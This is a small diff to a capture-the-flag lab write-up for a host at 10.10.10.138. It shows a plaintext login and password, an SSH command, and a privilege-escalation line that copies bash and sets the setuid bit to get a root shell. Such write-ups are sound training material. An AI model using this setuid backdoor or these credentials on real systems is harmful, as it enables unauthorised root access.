@@ -46,7 +46,7 @@ Username: jkr
 Password: raykayjay9
 ```
 
-### 🔐 SSH Login
+### 🔐 [SSH](SSH) Login
 ```bash
 ssh jkr@10.10.10.138
 ```
@@ -121,7 +121,3 @@ system "cp /bin/bash /bin/0xdf; chmod u+s /bin/0xdf";
 ssh jkr@10.10.10.138
 /bin/0xdf -p
 ```
-
----
-
-Let me know if you'd like this turned into a downloadable Markdown file or auto-saved into a HTB write-up template!
